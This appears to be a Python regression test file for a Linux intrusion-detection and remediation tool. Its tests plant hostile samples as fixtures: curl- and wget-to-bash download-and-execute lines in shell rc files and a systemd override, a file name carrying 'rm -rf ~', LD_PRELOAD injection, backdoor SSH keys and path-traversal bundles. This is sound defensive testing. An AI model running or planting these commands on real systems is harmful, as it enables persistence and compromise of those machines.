"""Regression tests for the 2026-10-16 pre-conference audit.

Each test is named after its audit item (S = security, T = TUI, M = remediation,
D = detection, W = reporting) — see CLAUDE.md "Known Bugs Fixed".
"""
import os
import subprocess
import sys

from ubuntils import __version__

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


# ─── S1: sudo re-exec must not import code from the working directory ────────

def _plant_hijack(directory):
    pkg = directory / "ubuntils"
    pkg.mkdir()
    (pkg / "__init__.py").write_text("print('HIJACKED'); __version__ = 'evil'\n")
    (pkg / "cli.py").write_text("print('HIJACKED')\ndef main(): pass\n")


def _run_in(cwd, argv):
    # PYTHONPATH makes the real package importable; it sits *after* the cwd
    # entry Python adds for -m/-c, so a planted package would still win.
    env = dict(os.environ, PYTHONPATH=REPO_ROOT)
    return subprocess.run([sys.executable, *argv], cwd=cwd, env=env,
                          capture_output=True, text=True, timeout=60)


def test_S1_reexec_bootstrap_ignores_planted_package_in_cwd(tmp_path):
    from ubuntils.cli import REEXEC_BOOTSTRAP
    _plant_hijack(tmp_path)

    # The vector: `python -m ubuntils.cli` from an attacker-controlled cwd.
    hijacked = _run_in(tmp_path, ["-m", "ubuntils.cli", "version"])
    assert "HIJACKED" in hijacked.stdout

    safe = _run_in(tmp_path, ["-c", REEXEC_BOOTSTRAP, "version"])
    assert "HIJACKED" not in safe.stdout + safe.stderr
    assert safe.stdout.strip() == __version__


def test_S1_ensure_root_reexecs_through_the_bootstrap(monkeypatch):
    from ubuntils import cli
    captured = {}
    monkeypatch.setattr(cli.os, "geteuid", lambda: 1000)
    monkeypatch.setattr(cli.os, "execv", lambda path, args: captured.update(path=path, args=args))
    monkeypatch.setattr(cli, "resolve_command", lambda name: "/usr/bin/sudo")
    monkeypatch.setattr(cli.sys, "argv", ["ubuntils", "scan", "--json"])
    cli._ensure_root()
    args = captured["args"]
    assert "-m" not in args
    assert args[:4] == ["sudo", sys.executable, "-c", cli.REEXEC_BOOTSTRAP]
    assert args[4:] == ["scan", "--json"]


# ─── S2: a hostile bundle must not read the analyst's own files ──────────────

def _bundle_tree(tmp_path):
    root = tmp_path / "extract" / "bundle" / "files"
    (root / "etc").mkdir(parents=True)
    secret = tmp_path / "analyst" / ".ssh"
    secret.mkdir(parents=True)
    (secret / "authorized_keys").write_text("ssh-ed25519 AAAAANALYSTSECRET analyst@laptop\n")
    return root


def test_S2_bundle_source_refuses_paths_that_escape_the_bundle(tmp_path):
    import pytest
    from ubuntils.collectors.source import BundleSource, SourceContainmentError
    from ubuntils.collectors.ssh import SSHCollector

    root = _bundle_tree(tmp_path)
    # A planted passwd entry whose home climbs out of the extraction dir.
    (root / "etc" / "passwd").write_text("eve:x:1000:1000::/../../../analyst:/bin/bash\n")
    src = BundleSource(root_dir=str(root), command_index={})

    with pytest.raises(SourceContainmentError):
        src.read_text("/../../../analyst/.ssh/authorized_keys")
    assert src.exists("/../../../analyst/.ssh/authorized_keys") is False
    keys = SSHCollector(source=src).collect()["authorized_keys"]
    assert not any("ANALYSTSECRET" in k["key_data"] for k in keys)


def _write_crafted_bundle(tmp_path, command_bundle_path):
    import json
    import tarfile
    from ubuntils.bundle.manifest import CommandEntry, Manifest

    staging = tmp_path / "staging" / "bundle"
    (staging / "commands").mkdir(parents=True)
    (staging / "files").mkdir()
    manifest = Manifest(
        run_id="r", host_id="", hostname="victim", ubuntu_version="U",
        collected_at_utc_start="", collected_at_utc_end="", tool_version="2.2.0",
        files=[], commands=[CommandEntry(name="lsmod", argv=["lsmod"],
                                         bundle_path=command_bundle_path,
                                         sha256="0" * 64, exit_code=0)],
    )
    data = manifest.to_dict()
    data["bundle_sha256"] = manifest.manifest_sha256()  # unkeyed: anyone can recompute it
    (staging / "manifest.json").write_text(json.dumps(data))
    out = tmp_path / "crafted.tar.gz"
    with tarfile.open(out, "w:gz") as tf:
        tf.add(staging, arcname="bundle")
    return out


def test_S2_read_bundle_rejects_manifest_paths_outside_the_bundle(tmp_path):
    import pytest
    from ubuntils.bundle import BundleError, read_bundle

    (tmp_path / "analyst-secret.txt").write_text("TOP SECRET\n")
    for bad in ("../../../analyst-secret.txt", "/etc/hostname"):
        crafted = _write_crafted_bundle(tmp_path / bad.replace("/", "_"), bad)
        with pytest.raises(BundleError, match="outside the bundle"):
            read_bundle(str(crafted))


# ─── T1: attacker text must never be parsed as Rich markup ───────────────────

def _hostile_finding():
    from ubuntils.detectors.finding import Finding, Severity
    return Finding(
        rule_id="CRON_TMP_PATH", severity=Severity.HIGH, title="t",
        description="cron job [green]looks fine[/green]",
        artifact_path="/etc/cron.d/[evil]",
        raw_value="/tmp/x # [/bold] closes nothing",
        remediation_available=True, remediation_description="Remove the line",
    )


async def test_T1_detail_pane_survives_markup_in_attacker_text():
    from textual.app import App
    from ubuntils.detectors.finding import RemediationResult, RemediationStatus
    from ubuntils.tui.findings_panel import FindingDetail, FindingsPanel

    finding = _hostile_finding()

    class _App(App):
        def compose(self):
            yield FindingsPanel([finding])

    async with _App().run_test() as pilot:
        panel = pilot.app.query_one(FindingsPanel)
        detail = pilot.app.query_one(FindingDetail)
        detail.show(finding)          # raised MarkupError before the fix
        await pilot.pause()
        shown = str(detail.content)
        assert "[/bold] closes nothing" in shown
        assert "[green]looks fine[/green]" in shown   # shown literally, not styled

        panel.mark_fixed(finding, RemediationResult(
            finding_rule_id="CRON_TMP_PATH", status=RemediationStatus.SUCCESS, message="ok"))
        await pilot.pause()
        from textual.widgets import Label
        row = str(pilot.app.query_one("#finding-0").query_one(Label).content)
        assert row.endswith("[fixed]") and "/etc/cron.d/[evil]" in row


def test_T1_stats_panel_renders_bracketed_errors_literally():
    from ubuntils.tui.stats_panel import StatsPanel
    panel = StatsPanel({"collectors_degraded": {"SSHCollector": ["[Errno 2] gone [/x]"]}})
    static = list(panel.compose())[0]
    assert "[Errno 2] gone [/x]" in str(static.content)


# ─── M1–M3: remediation ──────────────────────────────────────────────────────

def _cron_finding(path, line):
    from ubuntils.detectors.finding import Finding, Severity
    return Finding(rule_id="CRON_TMP_PATH", severity=Severity.HIGH, title="t", description="d",
                   artifact_path=str(path), raw_value=line, remediation_available=True)


def test_M1_dry_run_writes_nothing(tmp_path):
    from ubuntils.detectors.finding import RemediationStatus
    from ubuntils.remediators.cron import CronRemediator

    cron = tmp_path / "evil"
    cron.write_text("* * * * * root /tmp/a.sh\n")
    backups = tmp_path / "backups"
    result = CronRemediator(backup_base=str(backups)).remediate(
        _cron_finding(cron, "* * * * * root /tmp/a.sh"), dry_run=True)
    assert result.status == RemediationStatus.SUCCESS
    assert result.backup_path is None and result.rollback_command is None
    assert not backups.exists()


def test_M2_two_fixes_to_one_file_in_the_same_second_both_succeed(tmp_path):
    from ubuntils.detectors.finding import RemediationStatus
    from ubuntils.remediators.cron import CronRemediator

    cron = tmp_path / "evil"
    cron.write_text("* * * * * root /tmp/a.sh\n* * * * * root /tmp/b.sh\n0 0 * * * root /usr/bin/ok\n")
    backups = str(tmp_path / "backups")
    first = CronRemediator(backup_base=backups).remediate(
        _cron_finding(cron, "* * * * * root /tmp/a.sh"), dry_run=False)
    second = CronRemediator(backup_base=backups).remediate(
        _cron_finding(cron, "* * * * * root /tmp/b.sh"), dry_run=False)
    assert [first.status, second.status] == [RemediationStatus.SUCCESS] * 2
    assert first.backup_path != second.backup_path
    assert cron.read_text() == "0 0 * * * root /usr/bin/ok\n"


def test_M3_rollback_command_is_shell_quoted(tmp_path):
    import shlex
    from ubuntils.remediators.cron import CronRemediator

    cron = tmp_path / "dir with space" / "evil;rm -rf ~"
    cron.parent.mkdir()
    cron.write_text("* * * * * root /tmp/a.sh\n")
    result = CronRemediator(backup_base=str(tmp_path / "b")).remediate(
        _cron_finding(cron, "* * * * * root /tmp/a.sh"), dry_run=False)
    assert shlex.split(result.rollback_command) == ["cp", result.backup_path, str(cron)]


# ─── S3: user-controlled files can't hang or poison the scan ─────────────────

def _home_with(tmp_path, name, maker):
    (tmp_path / "etc").mkdir(exist_ok=True)
    (tmp_path / "etc" / "passwd").write_text("eve:x:1000:1000::/home/eve:/bin/bash\n")
    home = tmp_path / "home" / "eve"
    (home / ".ssh").mkdir(parents=True, exist_ok=True)
    maker(home / name)
    from ubuntils.collectors.source import LiveSource
    return LiveSource(root=str(tmp_path))


def test_S3_fifo_bashrc_is_skipped_not_waited_on(tmp_path):
    from ubuntils.collectors.environment import EnvironmentCollector
    src = _home_with(tmp_path, ".bashrc", lambda p: os.mkfifo(p))
    collector = EnvironmentCollector(source=src)
    result = collector.collect()          # blocked forever in open() before the fix
    assert result["shell_init_files"] == []
    assert any(".bashrc" in r and "not a regular file" in r for r in collector.degraded)


def test_S3_huge_sparse_bashrc_is_skipped(tmp_path):
    from ubuntils.collectors.environment import EnvironmentCollector

    def sparse(p):
        with open(p, "wb") as f:
            f.truncate(8 * 1024 ** 3)     # 8 GiB, no disk used
    collector = EnvironmentCollector(source=_home_with(tmp_path, ".bashrc", sparse))
    assert collector.collect()["shell_init_files"] == []
    assert any("larger than" in r for r in collector.degraded)


def test_S3_symlink_to_device_is_refused(tmp_path):
    import pytest
    from ubuntils.collectors.source import LiveSource, UnsafeFileError
    link = tmp_path / "bashrc"
    link.symlink_to("/dev/zero")
    with pytest.raises(UnsafeFileError):
        LiveSource().read_user_text(str(link))


def test_S3_symlinked_dotfile_to_a_regular_file_is_still_read(tmp_path):
    # GNU stow & co. symlink ~/.bashrc into a dotfiles repo — keep reading it.
    from ubuntils.collectors.environment import EnvironmentCollector
    real = tmp_path / "dotfiles-bashrc"
    real.write_text("export LD_PRELOAD=/tmp/evil.so\n")
    src = _home_with(tmp_path, ".bashrc", lambda p: p.symlink_to(real))
    defs = EnvironmentCollector(source=src).collect()["env_definitions"]
    assert any(d["variable"] == "LD_PRELOAD" for d in defs)


def test_S3_shadow_lines_behind_a_symlinked_authorized_keys_never_reach_the_report(tmp_path):
    from ubuntils.collectors.ssh import SSHCollector
    shadow = tmp_path / "shadow"
    shadow.write_text("root:$6$saltsalt$HASHHASH:19000:0:99999:7:::\n")
    src = _home_with(tmp_path, ".ssh/authorized_keys", lambda p: p.symlink_to(shadow))
    keys = SSHCollector(source=src).collect()["authorized_keys"]
    assert keys == []


# ─── D1–D3, M4–M5: SSH keys ──────────────────────────────────────────────────

import time as _time  # noqa: E402


def _key(path="/home/eve/.ssh/authorized_keys", options="", mtime=None, ctime=None,
         data="AAAAKEY", raw_line=None):
    now = _time.time()
    return {
        "username": "eve", "home": "/home/eve", "path": path,
        "key_type": "ssh-ed25519", "key_data": data, "comment": "eve@x", "options": options,
        "raw_line": raw_line or f"{options + ' ' if options else ''}ssh-ed25519 {data} eve@x",
        "file_mtime": now if mtime is None else mtime,
        "file_ctime": now if ctime is None else ctime,
    }


def test_D1_timestomped_authorized_keys_is_still_flagged():
    from ubuntils.detectors.rules import rule_ssh_unauthorized_key
    month_ago = _time.time() - 30 * 86400
    findings = rule_ssh_unauthorized_key({"authorized_keys": [_key(mtime=month_ago)]})
    assert len(findings) == 1
    assert "mtime_predates_ctime" in [s["name"] for s in findings[0].signals]


def test_D3_authorized_keys2_and_custom_AuthorizedKeysFile_are_read(tmp_path):
    from ubuntils.collectors.source import LiveSource
    from ubuntils.collectors.ssh import SSHCollector
    from ubuntils.detectors.rules import rule_ssh_unauthorized_key

    (tmp_path / "etc" / "ssh" / "sshd_config.d").mkdir(parents=True)
    (tmp_path / "etc" / "passwd").write_text("eve:x:1000:1000::/home/eve:/bin/bash\n")
    (tmp_path / "etc" / "ssh" / "sshd_config.d" / "10-keys.conf").write_text(
        "AuthorizedKeysFile .ssh/authorized_keys /etc/ssh/keys/%u.pub  # central keys\n")
    (tmp_path / "etc" / "ssh" / "keys").mkdir()
    (tmp_path / "etc" / "ssh" / "keys" / "eve.pub").write_text("ssh-ed25519 AAAACENTRAL c\n")
    ssh_dir = tmp_path / "home" / "eve" / ".ssh"
    ssh_dir.mkdir(parents=True)
    legacy = ssh_dir / "authorized_keys2"
    legacy.write_text("ssh-ed25519 AAAAHIDDEN backdoor\n")
    old = _time.time() - 90 * 86400
    os.utime(legacy, (old, old))

    keys = SSHCollector(source=LiveSource(root=str(tmp_path))).collect()["authorized_keys"]
    by_data = {k["key_data"]: k["path"] for k in keys}
    assert by_data == {"AAAAHIDDEN": "/home/eve/.ssh/authorized_keys2",
                       "AAAACENTRAL": "/etc/ssh/keys/eve.pub"}
    # Old, but in authorized_keys2: still reported.
    flagged = [f for f in rule_ssh_unauthorized_key({"authorized_keys": keys})
               if f.artifact_path.endswith("authorized_keys2")]
    assert len(flagged) == 1


def test_M4_key_with_options_is_remediable_end_to_end(tmp_path):
    from ubuntils.collectors.source import LiveSource
    from ubuntils.collectors.ssh import SSHCollector
    from ubuntils.detectors.finding import RemediationStatus
    from ubuntils.detectors.rules import rule_ssh_unauthorized_key
    from ubuntils.remediators.ssh import SSHRemediator

    (tmp_path / "etc").mkdir()
    (tmp_path / "etc" / "passwd").write_text("eve:x:1000:1000::/home/eve:/bin/bash\n")
    ssh_dir = tmp_path / "home" / "eve" / ".ssh"
    ssh_dir.mkdir(parents=True)
    keys_file = ssh_dir / "authorized_keys"
    backdoor = 'command="/tmp/.x",no-pty  ssh-ed25519   AAAABACKDOOR  implant'
    keys_file.write_text(backdoor + "\n")

    keys = SSHCollector(source=LiveSource(root=str(tmp_path))).collect()["authorized_keys"]
    finding = rule_ssh_unauthorized_key({"authorized_keys": keys})[0]
    assert finding.raw_value == backdoor
    finding.artifact_path = str(keys_file)  # the host path a live scan would report
    result = SSHRemediator(backup_base=str(tmp_path / "b")).remediate(finding, dry_run=False)
    assert result.status == RemediationStatus.SUCCESS, result.message
    assert keys_file.read_text() == ""


def test_M5_plain_keys_in_a_multi_key_file_stay_below_the_remediation_gate():
    from ubuntils.detectors.rules import rule_ssh_unauthorized_key
    from ubuntils.pipeline import DEFAULT_MIN_REMEDIATION_CONFIDENCE
    findings = rule_ssh_unauthorized_key({"authorized_keys": [
        _key(data="AAAAADMIN"), _key(data="AAAANEW"),
        _key(data="AAAABAD", options='command="/tmp/x"'),
    ]})
    by_data = {f.raw_value.split()[-2]: f for f in findings}
    assert by_data["AAAAADMIN"].confidence < DEFAULT_MIN_REMEDIATION_CONFIDENCE
    assert by_data["AAAANEW"].confidence < DEFAULT_MIN_REMEDIATION_CONFIDENCE
    assert by_data["AAAABAD"].confidence >= DEFAULT_MIN_REMEDIATION_CONFIDENCE
    # A lone recent key is still unambiguous.
    single = rule_ssh_unauthorized_key({"authorized_keys": [_key()]})[0]
    assert single.confidence >= DEFAULT_MIN_REMEDIATION_CONFIDENCE


# ─── D1–D2, D5: shell init files ─────────────────────────────────────────────

def test_D2_old_rc_file_with_download_and_execute_is_flagged():
    from ubuntils.detectors.finding import Severity
    from ubuntils.detectors.rules import rule_shell_rc_modification
    old = _time.time() - 30 * 86400
    findings = rule_shell_rc_modification({"shell_init_files": [{
        "owner": "eve", "source": "/home/eve/.bashrc", "mtime": old, "ctime": old,
        "content": "curl -s http://x.example/i | bash\n"}]})
    assert len(findings) == 1 and findings[0].severity == Severity.MEDIUM


def test_D1_timestomped_rc_file_is_flagged():
    from ubuntils.detectors.rules import rule_shell_rc_modification
    findings = rule_shell_rc_modification({"shell_init_files": [{
        "owner": "eve", "source": "/home/eve/.profile", "mtime": _time.time() - 30 * 86400,
        "ctime": _time.time(), "content": "alias ll='ls -l'\n"}]})
    assert [s["name"] for s in findings[0].signals] == ["mtime_predates_ctime"]
    # Weak on its own: useradd copying /etc/skel looks identical (seen live on 26.04).
    assert findings[0].confidence == 60


def test_D5_system_bashrc_and_zsh_files_are_collected(tmp_path):
    from ubuntils.collectors.environment import EnvironmentCollector
    from ubuntils.collectors.source import LiveSource
    (tmp_path / "etc" / "zsh").mkdir(parents=True)
    (tmp_path / "etc" / "passwd").write_text("eve:x:1000:1000::/home/eve:/bin/bash\n")
    (tmp_path / "etc" / "bash.bashrc").write_text("export LD_PRELOAD=/dev/shm/r.so\n")
    (tmp_path / "etc" / "zsh" / "zshenv").write_text("wget -qO- http://x | sh\n")
    (tmp_path / "home" / "eve").mkdir(parents=True)
    (tmp_path / "home" / "eve" / ".zshenv").write_text("export A=1\n")

    result = EnvironmentCollector(source=LiveSource(root=str(tmp_path))).collect()
    sources = {f["source"] for f in result["shell_init_files"]}
    assert {"/etc/bash.bashrc", "/etc/zsh/zshenv", "/home/eve/.zshenv"} <= sources
    assert any(d["source"] == "/etc/bash.bashrc" and d["variable"] == "LD_PRELOAD"
               for d in result["env_definitions"])


# ─── D4: systemd drop-in overrides ───────────────────────────────────────────

def test_D4_dropin_override_replacing_execstart_is_flagged(tmp_path):
    from ubuntils.collectors.source import LiveSource
    from ubuntils.collectors.systemd import SystemdCollector
    from ubuntils.detectors.rules import rule_suspicious_systemd_timer

    unit_dir = tmp_path / "etc" / "systemd" / "system"
    (unit_dir / "ssh.service.d").mkdir(parents=True)
    (unit_dir / "ssh.service.d" / "override.conf").write_text(
        "[Service]\nExecStart=\nExecStart=/usr/bin/bash -c 'curl -s http://c2.example/s | bash'\n")
    services = SystemdCollector(source=LiveSource(root=str(tmp_path), offline=True)).collect()["services"]
    dropins = [s for s in services if s["dropin"]]
    assert [s["unit"] for s in dropins] == ["ssh.service"]

    findings = rule_suspicious_systemd_timer({"timers": [], "services": services})
    assert len(findings) == 1
    assert "drop-in override" in findings[0].description
    assert "downloads and executes" in findings[0].description


# ─── D6: kernel-thread impersonation ─────────────────────────────────────────

def test_D6_userspace_process_named_like_a_kernel_thread_is_high():
    from ubuntils.detectors.finding import Severity
    from ubuntils.detectors.rules import rule_process_masquerade
    findings = rule_process_masquerade({"processes": [
        {"pid": 4242, "name": "kworker/0:2", "uid": 0, "exe": "/dev/shm/.k", "cmdline": "[kworker/0:2]"},
        {"pid": 13, "name": "ksoftirqd/0", "uid": 0, "exe": "", "cmdline": ""},       # real one
        {"pid": 77, "name": "bash", "uid": 0, "exe": "/var/tmp/x", "cmdline": "[celery]"},
    ]})
    by_pid = {f.artifact_path: f for f in findings}
    assert set(by_pid) == {"/proc/4242/exe", "/proc/77/exe"}
    assert by_pid["/proc/4242/exe"].severity == Severity.HIGH


# ─── W2: allowlist suppression is reported ───────────────────────────────────

def test_W2_allowlist_suppressions_are_counted(tmp_path):
    from ubuntils.collectors.source import LiveSource
    from ubuntils.pipeline import run_scan
    from ubuntils.utils.config import Allowlist

    (tmp_path / "etc").mkdir()
    (tmp_path / "etc" / "passwd").write_text(
        "root:x:0:0::/root:/bin/bash\nghost:x:0:0::/home/ghost:/bin/bash\n")
    result = run_scan(LiveSource(root=str(tmp_path), offline=True),
                      allowlist=Allowlist(rules=["USER_UID_ZERO"]), forward_wazuh=False)
    assert not any(f.rule_id == "USER_UID_ZERO" for f in result.findings)
    assert result.scan_metadata["suppressed_by_allowlist"] >= 1
    assert result.stats["suppressed_by_allowlist"] >= 1


# ─── Live 26.04 follow-up: removed-but-not-purged packages ───────────────────

_DPKG_STATUS = """\
Package: python3-twisted
Status: deinstall ok config-files
Priority: optional
Architecture: all

Package: libc6
Status: install ok installed
Architecture: arm64
Multi-Arch: same

Package: apparmor
Status: install ok installed
Architecture: arm64
"""


def test_package_collector_records_package_state_from_dpkg_status(tmp_path):
    from ubuntils.collectors.packages import PackageCollector
    from ubuntils.collectors.source import LiveSource

    info = tmp_path / "var" / "lib" / "dpkg"
    info.mkdir(parents=True)
    (info / "status").write_text(_DPKG_STATUS)

    class _Src(LiveSource):
        def run(self, name, argv, timeout=30):
            return {
                "dpkg_verify": ("missing     /usr/lib/python3/dist-packages/twisted/plugins\n"
                                "??5??????   /usr/lib/aarch64-linux-gnu/libc.so.6\n", "", 1),
                "dpkg_owners": ("python3-twisted: /usr/lib/python3/dist-packages/twisted/plugins\n"
                                "libc6:arm64: /usr/lib/aarch64-linux-gnu/libc.so.6\n", "", 0),
            }.get(name, ("", "", 0))

    entries = {e["path"]: e for e in
               PackageCollector(source=_Src(root=str(tmp_path))).collect()["dpkg_verify_entries"]}
    assert entries["/usr/lib/python3/dist-packages/twisted/plugins"]["package_state"] == "config-files"
    assert entries["/usr/lib/aarch64-linux-gnu/libc.so.6"]["package_state"] == "installed"


def test_package_tampered_ignores_leftovers_of_removed_packages():
    from ubuntils.detectors.rules import rule_package_tampered
    findings = rule_package_tampered({"dpkg_verify_entries": [
        {"path": "/usr/lib/python3/dist-packages/twisted/plugins", "flags": "", "missing": True,
         "is_conffile": False, "package": "python3-twisted", "package_state": "config-files"},
        {"path": "/usr/bin/passwd", "flags": "??5??????", "missing": False,
         "is_conffile": False, "package": "passwd", "package_state": "installed"},
    ]})
    assert [f.artifact_path for f in findings] == ["passwd"]


def test_bundles_capture_dpkg_status():
    from ubuntils.cli import COLLECT_FILES
    assert "/var/lib/dpkg/status" in COLLECT_FILES
